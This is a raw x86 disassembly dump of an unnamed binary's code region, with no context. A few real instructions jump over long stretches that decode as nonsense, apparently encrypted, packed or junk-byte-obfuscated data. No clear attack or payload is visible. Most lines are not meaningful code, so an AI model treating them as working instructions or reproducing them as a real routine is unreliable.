  410d23:	scas   eax,DWORD PTR es:[edi]
  410d24:	ret    
  410d25:	fiadd  DWORD PTR [ebx]
  410d27:	stc    
  410d28:	add    edx,ecx
  410d2a:	imul   edx,edi
  410d2d:	mov    edi,DWORD PTR [ebp-0x8]
  410d30:	mov    ebx,DWORD PTR [ebp-0x10]
  410d33:	sub    ebx,edi
  410d35:	cmp    ebx,edx
  410d37:	ja     0x410d45
  410d3d:	mov    edx,DWORD PTR [ebp-0x2c]
  410d40:	jmp    0x411f76
  410d45:	mov    edx,DWORD PTR [ebp-0x34]
  410d48:	mov    edi,DWORD PTR [ebp-0x4]
  410d4b:	xor    edx,eax
  410d4d:	xor    edi,eax
  410d4f:	jmp    0x410fd7
  410d54:	lds    edi,FWORD PTR [edx+edx*8]
  410d57:	ds fxch st(6)
  410d5a:	fxch   st(3)
  410d5c:	adc    ecx,edx
  410d5e:	add    dh,BYTE PTR [edi]
  410d60:	stos   DWORD PTR es:[edi],eax
  410d61:	in     al,0x82
  410d63:	icebp  
  410d64:	clc    
  410d65:	push   esp
  410d66:	js     0x410de0
  410d68:	in     eax,0x7e
  410d6a:	js     0x410de4
  410d6c:	sti    
  410d6d:	aam    0x3a
  410d6f:	(bad)  
  410d70:	jg     0x410da4
  410d72:	(bad)  
  410d73:	xor    ebx,edx
  410d75:	int3   
  410d76:	loop   0x410db9
  410d78:	xchg   ebx,eax
  410d79:	stos   BYTE PTR es:[edi],al
  410d7a:	mov    bl,0xe
  410d7c:	lock stos BYTE PTR es:[edi],al
  410d7e:	inc    DWORD PTR [edx+esi*4+0x730d03cb]
  410d85:	xor    bh,ah
  410d87:	hlt    
  410d88:	addr16 dec eax
  410d8a:	nop
  410d8b:	fadd   QWORD PTR [esi]
  410d8d:	mul    BYTE PTR [esi+0x4a3b570e]
  410d93:	ret    0xf5df
  410d96:	cmp    al,0xcd
  410d98:	imul   esi,esi,0x4
  410d9b:	xchg   edi,eax
  410d9c:	jp     0x410d46
  410d9e:	and    al,0xc3
  410da0:	fild   QWORD PTR [ebx]
  410da2:	or     BYTE PTR [ebp+0x2e73d6af],0xec
  410da9:	aad    0x8d
  410dab:	pop    ss
  410dac:	xchg   esp,eax
  410dad:	mov    cl,0x75
  410daf:	mov    al,0x7b
  410db1:	or     edi,ecx
  410db3:	sbb    al,0xd5
  410db5:	adc    eax,DWORD PTR ds:0x5ab43302
  410dbb:	cwde   
  410dbc:	mov    bl,BYTE PTR [edx+0x4bf9350f]
  410dc2:	arpl   WORD PTR [edx+0xcfda4d4],bp
  410dc8:	das    
  410dc9:	mov    esp,0xc523047
  410dce:	jmp    0x353c4d64
  410dd3:	mov    ecx,0x249153d7
  410dd8:	jg     0x410d89
  410dda:	mov    bl,0x95
  410ddc:	adc    eax,0xb1d98aa9
  410de1:	ins    DWORD PTR es:[edi],dx
  410de2:	pop    bx
  410de4:	jns    0x410dd2
  410de6:	jae    0x410e10
  410de8:	fstp   TBYTE PTR [ebp+edi*1-0x458f7521]
  410def:	pop    ss
  410df0:	fcmovnu st,st(5)
  410df2:	mov    ds:0xe1594ed3,eax
  410df7:	cmp    BYTE PTR [eiz*4+0x6d8b3882],bh
  410dfe:	js     0x410e18
  410e00:	pusha  
  410e01:	push   ebx
  410e02:	or     DWORD PTR [ebp+0x65],esi
  410e05:	fidiv  WORD PTR [esi-0x10]
  410e08:	btc    DWORD PTR [ecx+0x45],edi
  410e0c:	adc    bh,bl
  410e0e:	std    
  410e0f:	mov    ds:0xc6c324cc,eax
  410e14:	out    dx,eax
  410e15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e16:	xchg   ebp,eax
  410e17:	jecxz  0x410e62
  410e19:	lds    ebx,FWORD PTR ds:0x12b2a71a
  410e1f:	mov    DWORD PTR [eax+0x2fb037c5],eax
  410e25:	push   esp
  410e26:	jns    0x410e7f
  410e28:	inc    eax
  410e29:	sahf   
  410e2a:	cmp    edx,DWORD PTR [edx-0x51]
  410e2d:	jbe    0x410e68
  410e2f:	scas   eax,DWORD PTR es:[edi]
  410e30:	adc    eax,edi
  410e32:	mov    eax,0x5f3a6be
  410e37:	push   esi
  410e38:	out    0xee,eax
  410e3a:	sbb    cl,BYTE PTR [eax-0x4c788926]
  410e40:	(bad)  
  410e41:	fimul  DWORD PTR [ebp+edi*2-0x5a12f58c]
  410e48:	popa   
  410e49:	add    ecx,0xffffffe8
  410e4c:	sbb    BYTE PTR [ebx+0x7a],cl
  410e4f:	stos   DWORD PTR es:[edi],eax
  410e50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e51:	add    esp,DWORD PTR [esi+0x6]
  410e54:	xchg   esp,eax
  410e55:	xor    eax,DWORD PTR [ebx+0x3d]
  410e58:	int3   
  410e59:	mov    al,ds:0x1aa9ed11
  410e5e:	push   ecx
  410e5f:	ins    DWORD PTR es:[edi],dx
  410e60:	repz jmp 0x44dc3efe
  410e66:	mov    ch,0xe5
  410e68:	jae    0x410e70
  410e6a:	lock cmp eax,DWORD PTR [ebp-0x327b7740]
  410e71:	push   cs
  410e72:	pop    ds
  410e73:	mov    eax,0x1798be7c
  410e78:	pop    ss
  410e79:	lds    ecx,FWORD PTR [eax+0x344431dd]
  410e7f:	cmp    dl,BYTE PTR [edi+0x7d344ece]
  410e85:	fs ret 
  410e87:	repz add DWORD PTR [ecx],edx
  410e8a:	add    eax,0xee109629
  410e8f:	xchg   edi,eax
  410e90:	test   eax,0xba648143
  410e95:	loopne 0x410f07
  410e97:	xor    dh,al
  410e99:	outs   dx,DWORD PTR ds:[esi]
  410e9a:	out    dx,al
  410e9b:	pop    esp
  410e9c:	iret   
  410e9d:	adc    DWORD PTR [ebp-0x7a5c18cf],eax
  410ea3:	push   ecx
  410ea4:	ja     0x410efa
  410ea6:	push   ecx
  410ea7:	out    dx,eax
  410ea8:	mov    esp,0xfb2816e3
  410ead:	test   BYTE PTR [esi],bh
  410eaf:	pop    ecx
  410eb0:	call   0xfd594f37
  410eb5:	dec    esp
  410eb6:	les    edi,FWORD PTR [edx]
  410eb8:	xchg   BYTE PTR [esi+ebp*8],ch
  410ebb:	jns    0x410e6e
  410ebd:	xor    BYTE PTR [eax-0x593df5bb],0x10
  410ec4:	sahf   
  410ec5:	lods   al,BYTE PTR ds:[esi]
  410ec6:	std    
  410ec7:	loop   0x410ed9
  410ec9:	vpmaddwd ymm5,ymm1,YMMWORD PTR [ebx-0x4189d3af]
  410ed1:	adc    dl,BYTE PTR ss:[esi+0x6e]
  410ed5:	and    dl,BYTE PTR [edx-0x6e]
  410ed8:	or     eax,DWORD PTR [eax+0x69]
  410edb:	cmp    al,0x6
  410edd:	and    dh,0x2d
  410ee0:	mov    ?,WORD PTR [eax-0x3c]
  410ee3:	adc    esp,DWORD PTR [ebx+ebx*1]
  410ee6:	ja     0x410e97
  410ee8:	ss adc ah,0x7c
  410eec:	inc    esp
  410eed:	push   cs
  410eee:	cwde   
  410eef:	scas   eax,DWORD PTR es:[edi]
  410ef0:	fild   WORD PTR [edx]
  410ef2:	fist   DWORD PTR gs:[eax+0x3d828ef7]
  410ef9:	jae    0x410e95
  410efb:	sbb    eax,0x8c86b71a
  410f00:	(bad)  
  410f01:	test   al,0xa9
  410f03:	jnp    0x410f07
  410f05:	(bad)  
  410f07:	ret    0xf4cc
  410f0a:	push   esi
  410f0b:	je     0x410ec8
  410f0d:	hlt    
  410f0e:	mov    BYTE PTR [edi+0x7d293c28],cl
  410f14:	std    
  410f15:	in     al,dx
  410f16:	test   al,0xe6
  410f18:	repz add eax,0x426704c1
  410f1e:	mov    DWORD PTR [ebx-0x1c52dd0b],eax
  410f24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f25:	pop    eax
  410f26:	and    ebp,DWORD PTR [eax+0x4666941e]
  410f2c:	fistp  WORD PTR [ecx]
  410f2e:	jb     0x410f38
  410f30:	or     al,0x1
  410f32:	scas   al,BYTE PTR es:[edi]
  410f33:	(bad)  
  410f34:	call   0xb3dc:0xc8f1d637
  410f3b:	fisub  DWORD PTR [edx]
  410f3d:	cwde   
  410f3e:	rcl    dl,cl
  410f40:	xchg   esp,eax
  410f41:	fcomp  DWORD PTR [ebp-0x29bf10d6]
  410f47:	mov    ss,WORD PTR [edi-0x74]
  410f4a:	xchg   edx,eax
  410f4b:	mov    ah,cl
  410f4d:	shr    DWORD PTR [eax+eiz*2-0x250c61fb],0x6b
  410f55:	adc    ch,al
  410f57:	test   BYTE PTR [eax],bl
  410f59:	jbe    0x410f78
  410f5b:	jge    0x410f44
  410f5d:	pop    ss
  410f5e:	xor    BYTE PTR [ecx],ch
  410f60:	dec    esi
  410f61:	jge    0x410f61
  410f63:	aad    0x7a
  410f65:	and    dh,BYTE PTR [ebx-0x40]
  410f68:	jl     0x410f25
  410f6a:	ja     0x410f97
  410f6c:	sub    eax,0x23cd08a9
  410f71:	xchg   ebx,eax
  410f72:	push   ds
  410f73:	and    BYTE PTR [ebp-0x59],cl
  410f76:	and    eax,0x7ac4b8c1
  410f7b:	loop   0x410f6b
  410f7d:	xchg   ebp,eax
  410f7e:	add    DWORD PTR [ecx+0x50],eax
  410f81:	sbb    dh,BYTE PTR [edx]
  410f83:	xor    ecx,DWORD PTR [ecx+0x49a55aaa]
  410f89:	icebp  
  410f8a:	pop    esp
  410f8b:	adc    edi,DWORD PTR [edi-0x77]
  410f8e:	add    dh,bl
  410f90:	sub    ebx,ebp
  410f92:	outs   dx,DWORD PTR ds:[esi]
  410f93:	cdq    
  410f94:	push   ebx
  410f95:	stc    
  410f96:	das    
  410f97:	cmp    bl,BYTE PTR [esi+0x29]
  410f9a:	pop    eax
  410f9b:	jo     0x410f68
  410f9d:	imul   edx,DWORD PTR [esi],0x24d5b3a7
  410fa3:	and    eax,0x46f46582
  410fa8:	xor    ch,bh
  410faa:	ds lahf 
  410fac:	in     eax,dx
  410fad:	daa    
  410fae:	pop    eax
  410faf:	pop    eax
  410fb0:	or     bh,bh
  410fb2:	aaa    
  410fb3:	jp     0x410fc4
  410fb5:	jbe    0x410f46
  410fb7:	xchg   esi,eax
  410fb8:	add    al,BYTE PTR [ebp-0x1f]
  410fbb:	jnp    0x410f96
  410fbd:	push   ecx
  410fbe:	cmp    cl,BYTE PTR [esi+ecx*8+0x1d]
  410fc2:	test   BYTE PTR [eax+0x1f],cl
  410fc5:	dec    edx
  410fc6:	std    
  410fc7:	mov    eax,0x4c82865a
  410fcc:	fcomp  QWORD PTR [ebx+0x472889a5]
  410fd2:	adc    dl,BYTE PTR [esi+edx*8-0x6fc0f46]
  410fd9:	jmp    0x411261
  410fde:	int3   
  410fdf:	into   
  410fe0:	ror    esp,0xc1
  410fe3:	rcl    ecx,cl
  410fe5:	into   
  410fe6:	jbe    0x410f92
  410fe8:	inc    esp
  410fe9:	data16 data16 ficom WORD PTR [ebp-0x7b]
  410fee:	gs pop edx
  410ff0:	js     0x41106a
  410ff2:	in     eax,0x7e
  410ff4:	js     0x41106e
  410ff6:	sub    al,0xba
  410ff8:	mov    dh,0x45
  410ffa:	jnp    0x410fb8
  410ffc:	enter  0xf7a6,0x77
  411000:	and    eax,0x69d14321
  411005:	sub    BYTE PTR [esi-0x33],dl
  411008:	add    BYTE PTR [edi],cl
  41100a:	aam    0x1
  41100c:	pop    eax
  41100d:	clc    
  41100e:	add    DWORD PTR [esi],edi
  411010:	dec    edx
  411011:	cdq    
  411012:	fnstenv [edi+esi*4+0x371ac49a]
  411019:	jecxz  0x410f9e
  41101b:	dec    edi
  41101c:	push   ds
  41101d:	cmp    eax,0x25f556a0
  411022:	inc    esp
  411023:	sbb    DWORD PTR [ebx+0x7c],edx
  411026:	dec    edi
  411027:	inc    ebp
  411028:	cmovge ebp,ebx
  41102b:	scas   al,BYTE PTR es:[edi]
  41102c:	push   ebx
  41102d:	ja     0x410fc4
  41102f:	pop    esp
  411030:	pusha  
  411031:	fistp  QWORD PTR [ecx+0x4d9716c4]
  411037:	jle    0x411018
  411039:	push   eax
  41103a:	enter  0xce44,0x8
  41103e:	lods   eax,DWORD PTR ds:[esi]
  41103f:	or     al,0x8
  411041:	retf   
  411042:	xor    eax,0x2d3b2e78
  411047:	add    al,BYTE PTR [ebx-0x13abdce5]
  41104d:	mov    edi,0xa8f9b828
  411052:	aas    
  411053:	mov    ch,0xb1
  411055:	mov    BYTE PTR [edx+0x73],cl
  411058:	pop    ebp
  411059:	inc    ebx
  41105a:	jmp    0x9378:0x3fcb725b
  411061:	cmp    al,0x9e
  411063:	dec    ebx
  411064:	imul   edi,esi,0x2c881e63
  41106a:	lahf   
  41106b:	jb     0x411027
  41106d:	int    0x3b
  41106f:	cmp    BYTE PTR [esi+0x7c],dl
  411072:	or     eax,0x318fb990
  411077:	sbb    ebp,edx
  411079:	push   ecx
  41107a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41107b:	daa    
  41107c:	aaa    
  41107d:	push   0x6b
  41107f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411080:	mov    esp,0x2ff925cd
  411085:	or     esp,DWORD PTR [eax]
  411087:	pop    ds
  411088:	fs inc eax
  41108a:	add    eax,0xb7a46d61
  41108f:	imul   DWORD PTR [edi]
  411091:	loope  0x4110ec
  411093:	jbe    0x411104
  411095:	or     al,0x3c
  411097:	test   BYTE PTR [eax],0x4
  41109a:	cs cdq 
  41109c:	push   ss
  41109d:	loopne 0x411113
  41109f:	gs (bad) 
  4110a1:	test   eax,0xc5aa84e6
  4110a6:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4110a8:	iret   
  4110a9:	stos   BYTE PTR es:[edi],al
  4110aa:	jnp    0x41106d
  4110ac:	mov    WORD PTR [edi+0x3073f2b5],fs
  4110b2:	cmc    
  4110b3:	sbb    BYTE PTR [ebx+0x1278d78f],0xe7
  4110ba:	dec    ebx
  4110bb:	ins    DWORD PTR es:[edi],dx
  4110bc:	gs aas 
  4110be:	sub    edi,DWORD PTR [eax]
  4110c0:	adc    DWORD PTR [ebp+0x5437e73c],0x1c
  4110c7:	test   al,0xc2
  4110c9:	es jl  0x4110e7
  4110cc:	xchg   ebp,eax
  4110cd:	mov    esi,0x2eba597
  4110d2:	arpl   WORD PTR [ebp+eiz*2-0x64],sp
  4110d6:	fs pop es
  4110d8:	mov    ebp,0xdf708828
  4110dd:	call   0x7e59:0x5049c5a5
  4110e4:	ins    DWORD PTR es:[edi],dx
  4110e5:	sub    BYTE PTR [ecx-0x1a6acc72],ch
  4110eb:	icebp  
  4110ec:	sar    DWORD PTR [esi+0x1c580cea],0xb0
  4110f3:	mov    WORD PTR [ebx+ebp*8],cs
  4110f6:	pop    DWORD PTR [ebx+ebx*4+0x10]
  4110fa:	dec    edi
  4110fb:	ret    
  4110fc:	sbb    bl,BYTE PTR [esi+0x50]
  4110ff:	cdq    
  411100:	xchg   edx,eax
  411101:	in     al,0xf1
  411103:	xchg   edx,eax
  411104:	ret    
  411105:	in     al,dx
  411106:	sbb    BYTE PTR [eax+0x4d],cl
  411109:	push   esi
  41110a:	and    BYTE PTR [ebx],0xca
  41110d:	je     0x411133
  41110f:	mov    dh,0xa1
  411111:	mov    eax,ds:0xcb55d6db
  411116:	mov    edi,0x8dd1c2b2
  41111b:	stos   DWORD PTR es:[edi],eax
  41111c:	fadd   QWORD PTR [edx]
  41111e:	aaa    
  41111f:	enter  0xb691,0x8e
  411123:	cmc    
  411124:	dec    edi
  411125:	icebp  
  411126:	fcomp  DWORD PTR [esp-0x11]
  41112a:	(bad)  
  41112b:	mov    WORD PTR [edx-0x6bd5d6e3],fs
  411131:	loop   0x4110df
  411133:	pop    edx
  411134:	aam    0xbb
  411136:	sbb    ebx,DWORD PTR [edi]
  411138:	sub    DWORD PTR [ecx],0x21fc6985
  41113e:	xchg   ecx,eax
  41113f:	ja     0x4111be
  411141:	bound  edi,QWORD PTR [eax+0x7f]
  411144:	and    bl,cl
  411146:	(bad)  
  411147:	fstp   TBYTE PTR [edi]
  411149:	jmp    0xd64:0x67789270
  411150:	les    ebx,FWORD PTR [eiz*8+0x47afd239]
  411157:	sar    BYTE PTR [esp+esi*1+0x53],1
  41115b:	ficom  DWORD PTR [esi+0x6752fed2]
  411161:	call   0x258cae72
  411166:	pop    edx
  411167:	mov    WORD PTR [esp+ebx*8],es
  41116a:	mov    ebx,0x23fb2270
  41116f:	inc    esi
  411170:	mov    ds:0x355a2923,eax
  411175:	sbb    BYTE PTR [edx+0x20],0x19
  411179:	out    dx,eax
  41117a:	mov    cl,0xc1
  41117c:	and    ebp,ebp
  41117e:	jbe    0x411100
  411180:	inc    DWORD PTR [esi-0x6b]
  411183:	lds    ecx,FWORD PTR [eax+0x681fdc46]
  411189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41118a:	inc    edx
  41118b:	jb     0x4111f7
  41118d:	mov    ah,0x73
  41118f:	sub    DWORD PTR [edi],esi
  411191:	jmp    DWORD PTR [ecx-0x243dbc1a]
  411197:	pop    ebx
  411198:	pop    esi
  411199:	mov    ebp,0x9fa39e2a
  41119e:	mov    esi,0x3df9fc78
  4111a3:	sbb    DWORD PTR [esi],esi
  4111a5:	stc    
  4111a6:	mov    esi,0xda17fe5c
  4111ab:	xlat   BYTE PTR ds:[ebx]
  4111ac:	sbb    edi,ebp
  4111ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111af:	rol    DWORD PTR ss:[esi+0x5],0xd0
  4111b4:	in     al,0x8d
  4111b6:	aad    0xe0
  4111b8:	outs   dx,DWORD PTR ds:[esi]
  4111b9:	retf   0xc363
  4111bc:	aaa    
  4111bd:	add    bh,BYTE PTR [esp+eax*8]
  4111c0:	(bad)  
  4111c1:	loope  0x4111df
  4111c3:	xchg   ecx,eax
  4111c4:	push   0x48
  4111c6:	xchg   ebx,eax
  4111c7:	sbb    BYTE PTR [ebp+0x2f],dh
  4111ca:	sbb    DWORD PTR [ecx+edx*8+0x57],edi
  4111ce:	(bad)  
  4111cf:	mov    eax,ds:0x38f06673
  4111d4:	push   eax
  4111d5:	retf   0x9121
  4111d8:	sti    
  4111d9:	scas   al,BYTE PTR es:[edi]
  4111da:	(bad)  [eax-0x8]
  4111dd:	dec    ecx
  4111de:	fidivr WORD PTR [eax]
  4111e0:	xchg   ebx,eax
  4111e1:	cmc    
  4111e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111e3:	xchg   ebx,eax
  4111e4:	retf   
  4111e5:	mov    bh,0x2c
  4111e7:	adc    DWORD PTR [ecx],0xffffff91
  4111ea:	dec    esp
  4111eb:	sub    eax,0xd6728534
  4111f0:	call   0x224a7e49
  4111f5:	jno    0x41126d
  4111f7:	daa    
  4111f8:	arpl   WORD PTR [ebx],ax
  4111fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111fb:	ja     0x41119e
  4111fd:	fs stc 
  4111ff:	sub    dl,BYTE PTR [edi-0x7ac1b98d]
  411205:	jnp    0x411250
  411207:	cld    
  411208:	xchg   DWORD PTR [edx-0x10],edx
  41120b:	push   ebx
  41120c:	xchg   edi,eax
  41120d:	mov    esp,0xcdc0e2c2
  411212:	mov    edi,DWORD PTR [ebx-0x625ae440]
  411218:	retf   0xe7a9
  41121b:	xor    eax,DWORD PTR [ebx+eax*4+0x1e]
  41121f:	adc    edi,DWORD PTR [eax-0x35a8c919]
  411225:	hlt    
  411226:	ins    BYTE PTR es:[edi],dx
  411227:	in     eax,0xf6
  411229:	(bad)  
  41122a:	iret   
  41122b:	imul   edi,DWORD PTR [ebx],0x79
  41122e:	jge    0x4111f6
  411230:	sub    BYTE PTR [edx+0x1f],cl
  411233:	jno    0x41124d
  411235:	test   DWORD PTR [edi-0x1dbb1950],ecx
  41123b:	adc    eax,0xb87cb7c7
  411240:	shr    DWORD PTR [edx-0x25],0xa8
  411244:	sar    DWORD PTR ds:0x7ee7fc39,cl
  41124a:	cwde   
  41124b:	xor    BYTE PTR [ecx+0x6b],al
  41124e:	in     al,dx
  41124f:	jmp    0x753ee75f
  411254:	repz popa 
  411256:	test   al,0x62
  411258:	loop   0x4112cd
  41125a:	int    0x85
  41125c:	mov    ebx,0x80b7c5cd
  411261:	add    edx,ecx
  411263:	imul   edx,edi
  411266:	jmp    0x4114ee
  41126b:	aas    
  41126c:	xlat   BYTE PTR ds:[ebx]
  41126d:	xlat   BYTE PTR ds:[ebx]
  41126e:	retf   
  41126f:	xlat   BYTE PTR ds:[ebx]
  411270:	retf   
  411271:	rcr    ebx,cl
  411273:	and    cl,ah
  411275:	or     BYTE PTR [eax-0x32],al
  411278:	hlt    
  411279:	jecxz  0x411279
  41127b:	rcr    BYTE PTR [edi+0x78],cl
  41127e:	js     0x411265
  411280:	jle    0x4112fa
  411282:	js     0x4112c1
  411284:	in     eax,dx
  411285:	call   0x71be:0x43ed
  41128b:	dec    al
  41128d:	shr    DWORD PTR [edi+0xfbe06],0xbf
  411294:	push   edi
  411295:	lock in al,dx
  411297:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411298:	adc    eax,0xe6974e4
  41129d:	loopne 0x4112b2
  41129f:	mov    DWORD PTR [ebx-0x79],esp
  4112a2:	add    eax,0x55b409b3
  4112a7:	aam    0xf3
  4112a9:	mov    DWORD PTR [eax],0x73b504db
  4112af:	popa   
  4112b0:	cs jge 0x41130c
  4112b3:	push   esp
  4112b4:	clc    
  4112b5:	jns    0x411253
  4112b7:	lock sbb al,0x42
  4112ba:	xor    BYTE PTR [ebx+ebp*2],0x74
  4112be:	mov    ds:0x9dc7d8eb,eax
  4112c3:	into   
  4112c4:	jmp    0x688c:0xc6003273
  4112cb:	cmp    DWORD PTR [ecx+0x6568546d],eax
  4112d1:	aaa    
  4112d2:	enter  0x7c28,0x5c
  4112d6:	or     ebp,DWORD PTR [esi]
  4112d8:	jg     0x41133a
  4112da:	inc    ecx
  4112db:	push   cs
  4112dc:	xor    DWORD PTR [eax-0x78],eax
  4112df:	aas    
  4112e0:	nop
  4112e1:	cmp    BYTE PTR [esp+esi*2+0x3c],ah
  4112e5:	je     0x411272
  4112e7:	mov    ds:0x24a88f2,eax
  4112ec:	loopne 0x4112ce
  4112ee:	mov    bh,0x15
  4112f0:	cmp    al,0x8f
  4112f2:	pop    esi
  4112f3:	sbb    DWORD PTR [esi+0x56],esp
  4112f6:	push   ss
  4112f7:	push   ecx
  4112f8:	sbb    eax,0x43c699b8
  4112fd:	push   ds
  4112fe:	in     al,0x8a
  411300:	ins    BYTE PTR es:[edi],dx
  411301:	or     eax,0x51ad0ae2
  411306:	and    edx,ebx
  411308:	repz cmp ebp,DWORD PTR [esi]
  41130b:	rcl    BYTE PTR [edx],0x7
  41130e:	sub    ah,BYTE PTR ds:0xfb2a057b
  411314:	shl    DWORD PTR [edx],cl
  411316:	lock push ebp
  411318:	lods   al,BYTE PTR ds:[esi]
  411319:	push   ss
  41131a:	mov    ebx,?
  41131c:	xlat   BYTE PTR ds:[ebx]
  41131d:	jp     0x4112c6
  41131f:	add    edx,ebp
  411321:	inc    eax
  411322:	adc    DWORD PTR [ecx],esp
  411324:	xchg   ebx,eax
  411325:	(bad)  
  411326:	cmc    
  411327:	cmc    
  411328:	push   ds
  411329:	lock enter 0x7634,0x2a
  41132e:	jl     0x4112eb
  411330:	mov    fs,WORD PTR ds:0x6a34ffe7
  411336:	pusha  
  411337:	pop    ss
  411338:	outs   dx,BYTE PTR ds:[esi]
  411339:	es (bad) 
  41133b:	sub    BYTE PTR [eax+eiz*8],dh
  41133e:	daa    
  41133f:	das    
  411340:	dec    eax
  411341:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411342:	push   0xcbec5070
  411347:	inc    esp
  411348:	xor    al,BYTE PTR [ecx-0x66]
  41134b:	jbe    0x41139d
  41134d:	imul   edi,DWORD PTR [ebx+0x60419172],0xf0a720e4
  411357:	mov    dl,0x70
  411359:	mov    al,ds:0x6807716
  41135e:	lods   eax,DWORD PTR ds:[esi]
  41135f:	lahf   
  411360:	call   0x738ad45f
  411365:	xor    al,0x3a
  411367:	mov    ah,0x75
  411369:	mov    dl,0x40
  41136b:	int    0x47
  41136d:	mov    bh,0xf1
  41136f:	xchg   esp,eax
  411370:	aaa    
  411371:	popa   
  411372:	inc    ecx
  411373:	repnz jmp 0x4a5:0xbd7f9aa6
  41137b:	cmp    DWORD PTR [ebp+0x1a],ebx
  41137e:	pop    eax
  41137f:	add    al,0x72
  411381:	and    al,ch
  411383:	icebp  
  411384:	lods   eax,DWORD PTR ds:[esi]
  411385:	cmp    ah,BYTE PTR [ebp-0x4]
  411388:	sub    DWORD PTR [esi+eax*1+0x1df51621],ebx
  41138f:	push   esi
  411390:	and    DWORD PTR [ecx],ebx
  411392:	retf   
  411393:	enter  0x167a,0xba
  411397:	mov    WORD PTR [eax+0xfcdb7e9],ds
  41139d:	push   ebx
  41139e:	sbb    al,0x86
  4113a0:	mov    ecx,0x1c992095
  4113a5:	enter  0x79bb,0xf9
  4113a9:	mov    ebx,0x31e02603
  4113ae:	popf   
  4113af:	xor    DWORD PTR [eax-0x6cf7cd0b],0x4a
  4113b6:	dec    edi
  4113b7:	push   cs
  4113b8:	push   ss
  4113b9:	cmp    eax,0xfa18a743
  4113be:	mov    ebx,0x81b27154
  4113c3:	and    esi,0x55
  4113c6:	and    esi,esi
  4113c8:	mov    al,BYTE PTR [ecx]
  4113ca:	out    dx,al
  4113cb:	and    DWORD PTR [eax],0x5f
  4113ce:	gs in  eax,0xf2
  4113d1:	sti    
  4113d2:	cmp    DWORD PTR [ecx+0xa],ebx
  4113d5:	les    ebx,FWORD PTR [edx-0x6ed44f93]
  4113db:	pushf  
  4113dc:	pop    es
  4113dd:	cmp    cl,BYTE PTR [edx]
  4113df:	inc    DWORD PTR [edx]
  4113e1:	out    0x7a,eax
  4113e3:	retf   
  4113e4:	add    bh,BYTE PTR [ecx]
  4113e6:	pop    edi
  4113e7:	dec    esp
  4113e8:	sub    ebp,0x23
  4113eb:	ss push ebp
  4113ed:	mov    cs,WORD PTR [ebx-0x14e26133]
  4113f3:	retf   0xf1ba
  4113f6:	mov    esi,0x224bd828
  4113fb:	jno    0x411413
  4113fd:	sbb    ecx,ebx
  4113ff:	dec    esp
  411400:	sub    DWORD PTR [ebx+0x4f0cefdf],ebp
  411406:	out    dx,eax
  411407:	mov    edx,0x3348c9fa
  41140c:	xor    ebp,DWORD PTR [ecx+ebp*2]
  41140f:	mov    bh,BYTE PTR [ecx]
  411411:	test   BYTE PTR [eax+0x1d],cl
  411414:	xchg   ebp,eax
  411415:	je     0x4113a3
  411417:	push   edx
  411418:	push   ecx
  411419:	xchg   esp,eax
  41141a:	add    bh,al
  41141c:	fst    DWORD PTR [eax-0x34]
  41141f:	sar    BYTE PTR [edi],0xf5
  411422:	jp     0x4113ed
  411424:	fwait
  411425:	mov    ebx,0xb5216f15
  41142a:	cmc    
  41142b:	(bad)  
  41142c:	outs   dx,DWORD PTR ds:[esi]
  41142d:	jb     0x411496
  41142f:	xor    dl,bl
  411431:	pusha  
  411432:	cmp    eax,0x6342518a
  411437:	push   ebp
  411438:	pop    ebp
  411439:	add    eax,0xd87b494d
  41143e:	add    BYTE PTR [edi-0x78392b3b],cl
  411444:	add    DWORD PTR [ecx-0x1f6fe73f],edi
  41144a:	sahf   
  41144b:	xchg   ebp,eax
  41144c:	push   esp
  41144d:	pop    ds
  41144e:	fadd   QWORD PTR ds:0x775c892c
  411454:	in     eax,0x42
  411456:	cwde   
  411457:	mov    DWORD PTR [esi],ebp
  411459:	clc    
  41145a:	xor    esp,DWORD PTR [ecx]
  41145c:	rol    ch,cl
  41145e:	add    DWORD PTR [ebp-0x1f0975e2],eax
  411464:	or     BYTE PTR ds:0xbd507c3c,bh
  41146a:	cdq    
  41146b:	cmp    DWORD PTR [eax+0x51],edx
  41146e:	in     eax,dx
  41146f:	mov    cs,edi
  411471:	call   0x7232:0xd71806ef
  411478:	xchg   ecx,eax
  411479:	mov    BYTE PTR [eax],cl
  41147b:	pop    es
  41147c:	cmc    
  41147d:	sub    eax,0x683846fd
  411482:	or     esp,DWORD PTR [ebx-0x52]
  411485:	cmc    
  411486:	or     bl,0xca
  411489:	arpl   dx,sp
  41148b:	and    dl,BYTE PTR [edi]
  41148d:	ja     0x41149f
  41148f:	stos   DWORD PTR es:[edi],eax
  411490:	btr    eax,esi
  411493:	jl     0x4114d4
  411495:	xchg   edx,eax
  411496:	fsub   DWORD PTR [esi+eax*1+0x23d0736f]
  41149d:	popf   
  41149e:	xor    bh,BYTE PTR [esi+0x7f]
  4114a1:	in     al,dx
  4114a2:	push   edi
  4114a3:	xor    DWORD PTR [eax],0xf63f37c6
  4114a9:	sub    eax,DWORD PTR [ebx-0x77f92999]
  4114af:	jbe    0x411494
  4114b1:	mov    ah,0x57
  4114b3:	and    al,0x23
  4114b5:	mov    edi,0x35111075
  4114ba:	push   0xa29c7a2e
  4114bf:	xchg   BYTE PTR [edx],ch
  4114c1:	mov    eax,0x24a6eba4
  4114c6:	push   cs
  4114c7:	pop    edi
  4114c8:	ror    ecx,1
  4114ca:	pop    edx
  4114cb:	int    0x4e
  4114cd:	pop    edi
  4114ce:	dec    ebp
  4114cf:	aaa    
  4114d0:	xor    al,0x0
  4114d2:	scas   al,BYTE PTR es:[edi]
  4114d3:	cmp    BYTE PTR [eax],cl
  4114d5:	fsubrp st(3),st
  4114d7:	push   eax
  4114d8:	and    DWORD PTR [edx+0x4a],esi
  4114db:	sbb    BYTE PTR [ecx],ch
  4114dd:	enter  0xabe8,0xfd
  4114e1:	sub    BYTE PTR [ebx+0x375a203e],ah
